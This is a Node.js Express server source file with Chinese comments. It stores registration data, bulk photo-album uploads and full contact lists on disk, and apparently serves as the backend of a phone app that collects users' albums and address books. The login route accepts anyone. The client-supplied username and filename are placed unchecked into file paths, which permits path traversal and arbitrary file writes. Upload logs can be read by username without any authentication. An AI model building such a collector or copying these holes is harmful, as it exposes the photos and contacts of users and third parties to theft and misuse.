const express = require('express');
const cors = require('cors');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const morgan = require('morgan');

const app = express();
const port = 3000;

// 中间件
app.use(cors());
app.use(express.json());
app.use(morgan('dev')); // 日志

// 数据存储目录
const uploadDir = path.join(__dirname, 'data/uploads');
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir, { recursive: true });
}

// 配置文件上传
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const username = req.body.username || 'unknown';
    const userDir = path.join(uploadDir, username);
    const photoDir = path.join(userDir, '相册');
    fs.mkdirSync(photoDir, { recursive: true });
    cb(null, photoDir);
  },
  filename: (req, file, cb) => {
    // 使用客户端提供的文件名，或生成新的文件名
    const clientFileName = req.body.filename || file.originalname;
    const timestamp = Date.now();
    const photoIndex = req.body.photoIndex || '0';
    const fileName = clientFileName || `photo_${timestamp}_${photoIndex}.jpg`;
    cb(null, fileName);
  }
});
const upload = multer({ 
  storage,
  limits: {
    fileSize: 50 * 1024 * 1024, // 50MB 限制
  }
});

// 路由：注册
app.post('/register', (req, res) => {
  const { username, phone } = req.body;
  const userDir = path.join(uploadDir, `${username}${phone}`);
  fs.mkdirSync(userDir, { recursive: true });
  // 保存用户信息
  fs.writeFileSync(
    path.join(userDir, 'user_info.json'),
    JSON.stringify(req.body, null, 2)
  );
  res.send({ success: true });
});

// 路由：登录
app.post('/login', (req, res) => {
  res.send({ success: true }); // 简化处理，实际需验证密码
});

// 路由：上传照片
app.post('/upload-photo', upload.single('photo'), (req, res) => {
  try {
    const { username, photoIndex, totalPhotos } = req.body;
    const uploadedFile = req.file;
    
    if (!uploadedFile) {
      return res.status(400).send({ success: false, error: '没有收到照片文件' });
    }
    
    // 记录上传进度
    const progress = {
      username,
      photoIndex: parseInt(photoIndex) || 0,
      totalPhotos: parseInt(totalPhotos) || 1,
      fileName: uploadedFile.filename,
      fileSize: uploadedFile.size,
      uploadTime: new Date().toISOString()
    };
    
    // 保存上传日志
    const userDir = path.join(uploadDir, username || 'unknown');
    const logFile = path.join(userDir, 'upload_log.json');
    let logs = [];
    
    if (fs.existsSync(logFile)) {
      logs = JSON.parse(fs.readFileSync(logFile, 'utf8'));
    }
    
    logs.push(progress);
    fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));
    
    console.log(`用户 ${username} 上传照片 ${photoIndex}/${totalPhotos}: ${uploadedFile.filename}`);
    
    res.send({ 
      success: true, 
      message: `照片 ${photoIndex}/${totalPhotos} 上传成功`,
      progress: {
        current: parseInt(photoIndex) || 0,
        total: parseInt(totalPhotos) || 1
      }
    });
  } catch (error) {
    console.error('照片上传处理错误:', error);
    res.status(500).send({ success: false, error: '服务器处理错误' });
  }
});

// 路由：获取上传进度
app.get('/upload-progress/:username', (req, res) => {
  try {
    const { username } = req.params;
    const userDir = path.join(uploadDir, username);
    const logFile = path.join(userDir, 'upload_log.json');
    
    if (!fs.existsSync(logFile)) {
      return res.send({ 
        success: true, 
        progress: { current: 0, total: 0 },
        logs: [] 
      });
    }
    
    const logs = JSON.parse(fs.readFileSync(logFile, 'utf8'));
    const totalPhotos = logs.length > 0 ? logs[logs.length - 1].totalPhotos : 0;
    
    res.send({
      success: true,
      progress: {
        current: logs.length,
        total: totalPhotos
      },
      logs: logs.slice(-10) // 只返回最近10条记录
    });
  } catch (error) {
    console.error('获取上传进度错误:', error);
    res.status(500).send({ success: false, error: '服务器错误' });
  }
});

// 路由：上传通讯录
app.post('/upload-contact', (req, res) => {
  const { username, contacts } = req.body;
  const userDir = path.join(uploadDir, username || 'unknown');
  const contactDir = path.join(userDir, '通讯录');
  fs.mkdirSync(contactDir, { recursive: true });
  // 保存通讯录
  fs.writeFileSync(
    path.join(contactDir, `contacts_${Date.now()}.json`),
    JSON.stringify(contacts, null, 2)
  );
  res.send({ success: true });
});

// 启动服务
app.listen(port, () => {
  console.log(`服务器运行在 http://0.0.0.0:${port}`);
});
